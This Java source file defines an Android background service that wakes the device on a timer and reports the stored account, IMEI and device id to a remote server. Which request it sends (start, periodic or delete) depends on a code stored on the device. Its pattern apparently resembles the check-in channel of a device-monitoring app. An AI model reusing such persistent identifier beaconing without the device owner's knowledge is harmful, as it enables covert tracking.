package com.inet.android.bs;

import java.util.Calendar;

import org.json.JSONException;
import org.json.JSONObject;

import com.inet.android.request.DelRequest;
import com.inet.android.request.PeriodicRequest;
import com.inet.android.request.StartRequest;
import com.inet.android.utils.Logging;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.IBinder;
import android.preference.PreferenceManager;

/** ����� ������� �������� �������������� �������
 * 
 * @author johny homicide
 *
 */
public class Request4 extends Service {	
	private static final int SERVICE_REQUEST_CODE = 35;
		final String LOG_TAG = "request4";
		SharedPreferences sPref;
		int period = 10; // ������������� ��������

		public void onCreate() {
			super.onCreate();

			Logging.doLog(LOG_TAG, "onCreate", "onCreate");
		}

		public int onStartCommand(Intent intent, int flags, int startId) {
			Logging.doLog(LOG_TAG, "onStartCommand", "onStartCommand");
			
			SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
			String code = sp.getString("code", "-1");
			
			if (code.equals("-1")) {
				sendStartRequest();
			}

			// ������ �� device?
			if (code.equals("0")) {
				Logging.doLog(LOG_TAG, "code : 0", "code : 0");
				
				if (sp.getString("error", "-1").equals("0")) {
					sendStartRequest();
				}
				if (sp.getString("error", "-1").equals("1")) {
					sendStartRequest();
				}
				if (sp.getString("error", "-1").equals("2")) {
					sendStartRequest();
				}
			}
			
			if (code.equals("3")) {
				sendDelRequest();
			}
			
			if (code.equals("1") || code.equals("2")) {
				sendPeriodicRequest(); // ���������� �������������� �������
			}

			Calendar cal = Calendar.getInstance();
			cal.add(Calendar.MINUTE, Integer.parseInt(sp.getString("period", "120")));// ����� period �����

			PendingIntent servicePendingIntent = PendingIntent.getService(this,
					SERVICE_REQUEST_CODE, new Intent(this, Request4.class),
					PendingIntent.FLAG_UPDATE_CURRENT);

			AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
			am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(),
					servicePendingIntent);
			
			super.onStartCommand(intent, flags, startId);
			return Service.START_STICKY;
		}

//		private void requestTask() {
//			Logging.doLog(LOG_TAG, "requestTask start", "requestTask start");
//			RequestMakerImpl.diagRequest(getApplicationContext());
//			Logging.doLog(LOG_TAG, "requestTask end", "requestTask end");
//		}
		
		/**
		 * �������� ���������� �������
		 */
		private void sendStartRequest() {
			Logging.doLog(LOG_TAG, "send start request", "send start request");
			
			SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
			JSONObject jsonObject = new JSONObject();
			try {
				jsonObject.put("account", sp.getString("account", "0000"));
				jsonObject.put("imei", sp.getString("imei", "0000"));
				jsonObject.put("model", "iphone");
			} catch (JSONException e) {
				e.printStackTrace();
			}
			
			String str = jsonObject.toString();
			StartRequest sr = new StartRequest(this);
			sr.sendRequest(str);
		}
		
		/**
		 * �������� �������������� �������
		 */
		private void sendPeriodicRequest() {
			Logging.doLog(LOG_TAG, "requestTask start", "requestTask start");
			
			SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
			
			JSONObject jsonObject = new JSONObject();
			try {
				jsonObject.put("device", sp.getString("device", "0000"));
				jsonObject.put("account", sp.getString("account", "0000"));
				jsonObject.put("imei", sp.getString("imei", "0000"));
			} catch (JSONException e) {
				Logging.doLog(LOG_TAG, "���-�� �� ��� � json", "���-�� �� ��� � json");
				e.printStackTrace();
			}
			
			String str = jsonObject.toString(); 
			String code = null;

//			do {
//				Logging.doLog(LOG_TAG, "before req", "before req");
//				
//				PeriodicRequest pr = new PeriodicRequest(this);
//				pr.sendRequest(str);
//				
//				Logging.doLog(LOG_TAG, "post req", "post req");
//
//				code = sp.getString("code", "1");
//				if (code.equals("1")) {
//					try {
//						TimeUnit.MILLISECONDS.sleep(600000);
//					} catch (InterruptedException e) {
//						e.printStackTrace();
//					}
//				}
//			} while (!code.equals("2") && !code.equals("3"));
			
			Logging.doLog(LOG_TAG, "before req", "before req");
			
			PeriodicRequest pr = new PeriodicRequest(this);
			pr.sendRequest(str);
			
			Logging.doLog(LOG_TAG, "post req", "post req");

			Logging.doLog(LOG_TAG, "action - " + code, "action - " + code);
			Logging.doLog(LOG_TAG, "requestTask end", "requestTask end");
		}
		
		/**
		 * �������� ������� �� ��������
		 */
		public void sendDelRequest() {
			Logging.doLog(LOG_TAG, "sendDelRequest start", "sendDelRequest start");
			
			SharedPreferences sp = PreferenceManager.getDefaultSharedPreferences(this);
			
			JSONObject jsonObject = new JSONObject();
			try {
				jsonObject.put("device", sp.getString("device", "0000"));
				jsonObject.put("account", sp.getString("account", "0000"));
				jsonObject.put("imei", sp.getString("IMEI", "0000"));
				jsonObject.put("mode", "1");
			} catch (JSONException e) {
				Logging.doLog(LOG_TAG, "���-�� �� ��� � json", "���-�� �� ��� � json");
				e.printStackTrace();
			}
			
			String str = jsonObject.toString();
			DelRequest dr = new DelRequest(this);
			dr.sendRequest(str);
		}

		public void onDestroy() {
			super.onDestroy();
			Logging.doLog(LOG_TAG, "onDestroy", "onDestroy");
		}

		public IBinder onBind(Intent intent) {
			return null;
		}

		
	}